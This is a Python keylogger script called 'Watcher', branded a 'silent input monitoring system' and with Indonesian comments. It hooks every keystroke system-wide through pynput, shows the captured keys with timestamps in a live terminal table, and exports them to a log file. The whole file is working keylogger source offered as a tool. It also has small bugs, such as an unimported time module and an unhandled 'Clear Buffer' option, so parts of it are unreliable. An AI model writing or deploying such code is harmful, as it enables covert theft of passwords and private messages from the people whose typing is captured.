import asyncio
from pynput import keyboard
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from datetime import datetime
import questionary

console = Console()
log_buffer = []

# --- CORE LOGIC ---
def on_press(key):
    try:
        k = str(key.char)
    except AttributeError:
        k = f"[{str(key)}]"
    
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_buffer.append({"time": timestamp, "key": k})
    
    # Batasi buffer biar gak menuhin RAM
    if len(log_buffer) > 15:
        log_buffer.pop(0)

def generate_log_table():
    table = Table(title="[bold red]LIVE KEY-LOG STREAM[/bold red]", border_style="red")
    table.add_column("Timestamp", style="cyan", width=12)
    table.add_column("Keystroke Captured", style="green")
    
    for entry in reversed(log_buffer):
        table.add_row(entry["time"], entry["key"])
    return table

async def start_watcher():
    show_banner()
    console.print("[bold yellow][!] Watcher Engine Started. Monitoring all inputs...[/bold yellow]")
    console.print("[dim]Press 'ESC' in the monitored window to stop (Internal) or Ctrl+C here.[/dim]\n")
    
    # Start the listener in a non-blocking way
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        with Live(generate_log_table(), refresh_per_second=4) as live:
            while True:
                live.update(generate_log_table())
                await asyncio.sleep(0.25)
    except asyncio.CancelledError:
        listener.stop()

def show_banner():
    console.clear()
    banner = """
    [bold red]
     ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗███████╗██████╗ 
     ██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗
     ██║ █╗ ██║███████║   ██║   ██║     ███████║█████╗  ██████╔╝
     ██║███╗██║██╔══██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗
     ╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║███████╗██║  ██║
      ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    [/bold red]
    [bold white]          -- SILENT INPUT MONITORING SYSTEM --          [/bold white]
    """
    console.print(Panel(banner, border_style="red"))

async def main():
    while True:
        show_banner()
        action = await questionary.select(
            "Watcher Command Center:",
            choices=[
                "1. Start Live Monitoring",
                "2. Export Logs to File",
                "3. Clear Buffer",
                "4. Exit"
            ],
            style=questionary.Style([('pointer', 'fg:red bold'), ('highlighted', 'fg:white bg:red bold')])
        ).ask_async()

        if action == "1. Start Live Monitoring":
            try:
                await start_watcher()
            except KeyboardInterrupt:
                continue
        elif action == "2. Export Logs to File":
            with open("log_dump.txt", "a") as f:
                for b in log_buffer:
                    f.write(f"{b['time']} - {b['key']}\n")
            console.print("[bold green]✔ Logs exported to log_dump.txt[/bold green]")
            time.sleep(2)
        elif action == "4. Exit":
            break

if __name__ == "__main__":
    asyncio.run(main())
    